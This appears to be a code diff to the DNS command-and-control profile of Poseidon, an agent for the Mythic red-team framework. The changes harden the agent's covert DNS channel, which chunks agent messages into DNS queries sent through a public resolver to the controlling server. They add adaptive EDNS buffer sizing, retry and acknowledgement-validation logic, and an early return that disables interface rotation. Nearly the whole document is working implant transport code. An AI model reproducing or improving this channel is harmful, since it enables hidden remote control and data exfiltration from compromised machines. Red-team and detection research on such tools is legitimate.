@@ -7,16 +7,18 @@ import (
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles/dnsgrpc"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
-	"github.com/golang/protobuf/proto"
-	"github.com/miekg/dns"
+	"errors"
 	"math"
 	"net"
 	"os"
 	"slices"
 	"sort"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles/dnsgrpc"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
+	"github.com/golang/protobuf/proto"
+	"github.com/miekg/dns"
 
 	"encoding/json"
 	"fmt"
@@ -69,6 +71,7 @@ type C2DNS struct {
 	interruptSleepChannel chan bool
 	localInterfaces       []net.Interface
 	currentLocalInterface int
+	udpChunkSize          uint16
 }
 
 // DnsMessageStream tracks the progress of a message in chunk transfer
@@ -115,6 +118,7 @@ func init() {
 		stoppedChannel:        make(chan bool, 1),
 		interruptSleepChannel: make(chan bool, 1),
 		AgentSessionID:        rand.Uint32(),
+		udpChunkSize:          1232,
 	}
 	for _, domain := range initialConfig.Domains {
 		profile.DomainLengths[domain] = profile.getMaxLengthPerMessage(domain)
@@ -123,8 +127,8 @@ func init() {
 	if profile.DNSServer == "" {
 		profile.DNSServer = "8.8.8.8:53"
 	}
-	if profile.MaxQueryLength > 255 {
-		profile.MaxQueryLength = 255 // can't go past this
+	if profile.MaxQueryLength >= 255 {
+		profile.MaxQueryLength = 254 // can't go past this
 	}
 
 	// Convert sleep from string to integer
@@ -593,6 +597,8 @@ func (c *C2DNS) adjustLocalAddress() {
 		dnsClient.Dialer.LocalAddr = nil
 		return
 	}
+	dnsClient.Dialer.LocalAddr = nil
+	return
 	for _ = range c.localInterfaces {
 		c.currentLocalInterface = (c.currentLocalInterface + 1) % len(c.localInterfaces)
 		iface := c.localInterfaces[c.currentLocalInterface]
@@ -678,11 +684,14 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(1232, true)
+			m = m.SetEdns0(c.udpChunkSize, true)
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
 			response, _, err := dnsClient.Exchange(m, c.DNSServer)
+			if errors.Is(err, dns.ErrBuf) {
+				c.udpChunkSize = c.udpChunkSize + 1024
+			}
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d)/(%d): %v\n", i, chunks, err))
 				time.Sleep(1 * time.Second)
@@ -691,11 +700,13 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				continue
 			}
 			if response.Truncated {
+				i-- // deprecate the count and try again
 				utils.PrintDebug(fmt.Sprintf("Response truncated in sending message to server\n"))
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
 			}
 			if response.Rcode != dns.RcodeSuccess {
+				i-- // deprecate the count and try again
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
 				utils.PrintDebug(fmt.Sprintf("Failed to get successful response: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
@@ -706,6 +717,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
 				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+				continue
 			}
 			ackValues := make([]dns.RR, len(response.Answer))
 			var ackAgentSessionID net.IP
@@ -715,16 +727,27 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 			badAnswers := false
 			for answerIndex := range response.Answer {
 				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
-					i-- // deprecate the count and try again
-					time.Sleep(1 * time.Second)
 					chunkErrors += 1
 					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
 					badAnswers = true
 					break
 				}
+				if ackValues[response.Answer[answerIndex].Header().Ttl] != nil {
+					utils.PrintDebug(fmt.Sprintf("Duplicate TTL detected %d", response.Answer[answerIndex].Header().Ttl))
+					badAnswers = true
+					break
+				}
 				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
 			}
+			for index, _ := range ackValues {
+				if ackValues[index] == nil {
+					utils.PrintDebug(fmt.Sprintf("One of the values is nil, ackValues[%d]", index))
+					badAnswers = true
+				}
+			}
 			if badAnswers {
+				i-- // deprecate the count and try again
+				time.Sleep(1 * time.Second)
 				continue
 			}
 			if c.getRequestType() == dns.TypeA {
@@ -741,6 +764,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				ackAgentSessionID = make([]byte, net.IPv4len)
 				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
 				if err != nil {
+					i--
 					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
 					continue
 				}
@@ -749,6 +773,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				ackMessageID = make([]byte, net.IPv4len)
 				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
 				if err != nil {
+					i--
 					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
 					continue
 				}
@@ -757,6 +782,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				ackStartByte = make([]byte, net.IPv4len)
 				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
 				if err != nil {
+					i--
 					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
 					continue
 				}
@@ -765,6 +791,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				ackAction = make([]byte, net.IPv4len)
 				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
 				if err != nil {
+					i--
 					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
 					continue
 				}
@@ -848,21 +875,33 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(1232, true)
+			m = m.SetEdns0(c.udpChunkSize, true)
 			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
 			response, _, err := dnsClient.Exchange(m, c.DNSServer)
+			if err != nil && err.Error() == "dns: overflowing header size" {
+				c.udpChunkSize = c.udpChunkSize + 1024
+				if c.udpChunkSize < 1024 {
+					c.udpChunkSize = 4096
+				}
+				utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
+			}
 			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d): %v\n", lastChunk, err))
+				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk in getDNSMessageFromServer (%d): %v\n", lastChunk, err))
 				time.Sleep(1 * time.Second)
 				c.increaseErrorCount(domain)
 				continue
 			}
 			if response.Truncated {
 				utils.PrintDebug(fmt.Sprintf("Response truncated\n"))
+				c.udpChunkSize = c.udpChunkSize + 1024
+				if c.udpChunkSize < 1024 {
+					c.udpChunkSize = 4096
+				}
 				time.Sleep(1 * time.Second)
-				c.increaseErrorCount(domain)
+				//c.increaseErrorCount(domain)
+				continue
 			}
 			if response.Rcode != dns.RcodeSuccess {
 				time.Sleep(1 * time.Second)
@@ -881,11 +920,22 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			for answerIndex := range response.Answer {
 				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
 					time.Sleep(1 * time.Second)
-					utils.PrintDebug(fmt.Sprintf("Got pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+					badAnswers = true
+					break
+				}
+				if ackValues[response.Answer[answerIndex].Header().Ttl] != nil {
+					//utils.PrintDebug(fmt.Sprintf("Duplicate TTL detected %d, %v", response.Answer[answerIndex].Header().Ttl, response.Answer[answerIndex]))
 					badAnswers = true
 					break
 				}
 				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
+			}
+			for index, _ := range ackValues {
+				if ackValues[index] == nil {
+					utils.PrintDebug(fmt.Sprintf("One of the values is nil, ackValues[%d]", index))
+					badAnswers = true
+				}
 			}
 			if badAnswers {
 				continue
